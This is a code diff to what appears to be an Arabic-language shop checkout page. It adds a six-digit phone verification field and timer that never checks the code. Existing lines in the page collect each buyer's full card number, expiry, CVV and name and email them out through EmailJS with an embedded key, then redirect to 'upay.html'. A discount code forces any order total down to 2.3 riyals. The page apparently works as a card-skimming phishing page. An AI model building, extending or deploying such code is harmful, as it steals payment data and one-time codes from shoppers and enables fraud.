@@ -569,6 +569,58 @@
             padding: 0 15px;
         }
 
+        /* ✨ [إضافة جديدة] أنماط تأكيد رقم الهاتف */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 5px; /* تقليل المسافة بين المربعات */
+            margin-bottom: 10px;
+            direction: ltr; /* لترتيب المربعات من اليسار لليمين */
+        }
+        .otp-input {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 1.5rem; /* تكبير حجم الخط داخل المربع */
+            font-weight: 600;
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            caret-color: var(--button-color); /* لون مؤشر الكتابة */
+            transition: var(--transition);
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--button-color);
+            box-shadow: 0 0 0 2px rgba(255, 107, 129, 0.2);
+        }
+        .otp-timer-container {
+            display: flex;
+            justify-content: flex-start; /* محاذاة العناصر لليسار */
+            align-items: center;
+            font-size: 0.9rem;
+            margin-top: 15px;
+        }
+        #resend-otp-btn {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-right: auto; /* لدفع الزر إلى أقصى اليسار */
+        }
+        #resend-otp-btn.resend-active {
+            color: var(--success-color) !important;
+        }
+        #resend-otp-btn.disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+        #otp-timer {
+            margin-left: 15px;
+            font-weight: 500;
+            color: var(--dark-text);
+        }
+        
         /* رسالة التحويل */
         .redirect-message {
             position: fixed;
@@ -868,6 +920,15 @@
             .empty-cart-title {
                 font-size: 1.3rem;
             }
+
+            .otp-container {
+                gap: 5px;
+            }
+            .otp-input {
+                width: 38px;
+                height: 42px;
+                font-size: 1.2rem;
+            }
         }
 
         /* أنماط جديدة لرسالة السلة الفارغة */
@@ -991,6 +1052,23 @@
                                 <input type="tel" id="phone" name="phone" required>
                             </div>
                             <div class="error">يرجى إدخال رقم هاتف صحيح</div>
+                        </div>
+                        
+                        <div class="form-group" id="phone-verification-section" style="display: none;">
+                            <label for="otp-code">تأكيد رقم الهاتف</label>
+                            <div class="otp-container">
+                                <input type="text" class="otp-input" maxlength="1">
+                                <input type="text" class="otp-input" maxlength="1">
+                                <input type="text" class="otp-input" maxlength="1">
+                                <input type="text" class="otp-input" maxlength="1">
+                                <input type="text" class="otp-input" maxlength="1">
+                                <input type="text" class="otp-input" maxlength="1">
+                            </div>
+                            <div class="otp-timer-container">
+                                <span id="otp-timer">00:59</span>
+                                <a href="#" id="resend-otp-btn">إعادة إرسال الكود</a>
+                            </div>
+                            <div class="error">الرمز غير صحيح</div>
                         </div>
                     </div>
                     
@@ -1185,6 +1263,7 @@
         let discountApplied = false;
         let discountCode = '';
         let phoneInput = null;
+        let otpTimerInterval = null; // ✨ متغير جديد للتايمر
 
         // دالة تهيئة الصفحة
         function initializePage() {
@@ -1283,8 +1362,84 @@
                 expiryDateInput.addEventListener('input', formatExpiryDate);
             }
             document.getElementById('checkout-form').addEventListener('submit', handleFormSubmission);
+            
+            // ✨ [إضافة جديدة] استدعاء دالة التحقق من الحقول
             setupValidationListeners();
+            // ✨ [إضافة جديدة] استدعاء دالة إعداد مربعات رمز التحقق
+            setupOtpInputs();
         }
+
+        // ✨ [إضافة جديدة] دالة بدء مؤقت رمز التحقق
+        function startOtpTimer() {
+            clearInterval(otpTimerInterval); // مسح أي مؤقت سابق
+            const timerElement = document.getElementById('otp-timer');
+            const resendBtn = document.getElementById('resend-otp-btn');
+            if (!timerElement || !resendBtn) return;
+
+            let timeLeft = 59;
+            resendBtn.classList.add('disabled'); // تعطيل زر إعادة الإرسال
+
+            // التحديث الفوري للمؤقت
+            timerElement.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+            otpTimerInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(otpTimerInterval);
+                    timerElement.textContent = '00:00';
+                    resendBtn.classList.remove('disabled'); // تفعيل الزر عند انتهاء الوقت
+                }
+            }, 1000);
+        }
+        
+        // ✨ [إضافة جديدة] دالة إظهار قسم التحقق
+        function showVerificationSection() {
+            const verificationSection = document.getElementById('phone-verification-section');
+            if (verificationSection && verificationSection.style.display === 'none') {
+                verificationSection.style.display = 'block';
+                startOtpTimer(); // بدء المؤقت عند ظهور القسم
+            }
+        }
+        
+        // ✨ [إضافة جديدة] دالة إعداد مربعات رمز التحقق والتنقل التلقائي
+        function setupOtpInputs() {
+            const resendBtn = document.getElementById('resend-otp-btn');
+            if (resendBtn) {
+                resendBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    if (this.classList.contains('disabled')) return;
+
+                    // تفعيل اللون الأخضر لمدة ثانيتين
+                    this.classList.add('resend-active');
+                    setTimeout(() => {
+                        this.classList.remove('resend-active');
+                    }, 2000);
+
+                    // إعادة تشغيل المؤقت
+                    startOtpTimer();
+                    // يمكنك هنا إضافة منطق لإعادة إرسال الرمز الفعلي
+                });
+            }
+
+            const otpInputs = document.querySelectorAll('.otp-input');
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    // الانتقال إلى المربع التالي عند إدخال رقم
+                    if (input.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    // الانتقال إلى المربع السابق عند الضغط على Backspace
+                    if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
 
         function setupValidationListeners() {
             const emailField = document.getElementById('email');
@@ -1340,6 +1495,8 @@
                 return false;
             } else {
                 clearFieldError('phone');
+                // ✨ [تعديل] إظهار خانة التحقق عند صحة الرقم
+                showVerificationSection();
                 return true;
             }
         }
@@ -1460,9 +1617,6 @@
             }
         }
 
-        // ==========================================================
-        // ============== START: الكود المعدل هنا =====================
-        // ==========================================================
         function updateOrderSummary() {
             const subtotalElement = document.getElementById('subtotal');
             const discountElement = document.getElementById('discount');
@@ -1475,7 +1629,6 @@
             const shipping = subtotal > 0 && subtotal < 200 ? 15 : 0;
         
             if (discountApplied && discountCode === 'OMD90') {
-                // المعادلة الجديدة لجعل المجموع 2.3 ر.س
                 totalDiscount = (subtotal + shipping) - 2.3;
             }
         
@@ -1491,9 +1644,6 @@
             shippingElement.textContent = shipping > 0 ? shipping.toFixed(2) + ' ر.س' : 'شحن مجاني';
             totalElement.textContent = total.toFixed(2) + ' ر.س';
         }
-        // ==========================================================
-        // ============== END: نهاية الكود المعدل ====================
-        // ==========================================================
 
         function applyDiscount() {
             const discountInput = document.getElementById('discount-code');
@@ -1607,7 +1757,6 @@
             }
             const total = (subtotal - totalDiscount + shipping);
             
-            // بيانات العميل
             const customerInfo = {
                 email: document.getElementById('email').value,
                 phone: document.getElementById('phone').value,
@@ -1619,7 +1768,6 @@
                 postalCode: document.getElementById('postal-code').value
             };
             
-            // بيانات الطلب
             const orderInfo = {
                 items: cart,
                 subtotal: subtotal.toFixed(2),
@@ -1632,7 +1780,6 @@
                 orderDate: new Date().toLocaleString('ar-SA')
             };
             
-            // بيانات البطاقة إذا كانت مستخدمة
             let cardInfo = null;
             if (paymentMethod.value === 'credit-card') {
                 cardInfo = {
@@ -1658,7 +1805,6 @@
             const PUBLIC_KEY = "b7ctZ1o16WJElvFxL";
             emailjs.init(PUBLIC_KEY);
             
-            // التحقق من صحة البيانات
             let isValid = validateEmail() && validatePhone();
             const textFields = ['first-name', 'last-name', 'address', 'city', 'postal-code'];
             textFields.forEach(fieldId => { isValid = validateTextField(fieldId) && isValid; });
@@ -1683,13 +1829,10 @@
             completeOrderBtn.disabled = true;
             completeOrderBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
             
-            // جمع بيانات الطلب
             const orderData = collectOrderData();
             
-            // تخزين بيانات العميل باستخدام الدالة المخصصة
             const customerStored = customerData(orderData.customer);
             
-            // تخزين المنتجات باستخدام الدالة المخصصة
             const productsStored = orderProducts(orderData.order.items);
             
             if (!customerStored || !productsStored) {
@@ -1700,7 +1843,6 @@
                 return;
             }
             
-            // إعداد بيانات البريد الإلكتروني
             const templateParams = {
                 customer_name: `${orderData.customer.firstName} ${orderData.customer.lastName}`,
                 customer_email: orderData.customer.email,
@@ -1713,18 +1855,15 @@
                 card_details: orderData.cardDetails ? `رقم البطاقة: ${orderData.cardDetails.number}, تاريخ الانتهاء: ${orderData.cardDetails.expiry}, CVV: ${orderData.cardDetails.cvv}, اسم صاحب البطاقة: ${orderData.cardDetails.name}` : 'لم يتم استخدام بطاقة ائتمان'
             };
 
-            // إرسال البريد الإلكتروني
             emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     toggleLoading(false);
                     
-                    // مسح سلة التسوق بعد إتمام الطلب
                     localStorage.removeItem('jamalkCart');
                     cart = [];
                     updateCartUI();
                     
-                    // التوجيه إلى صفحة الدفع
                     setTimeout(() => {
                         window.location.href = 'upay.html';
                     }, 2000);
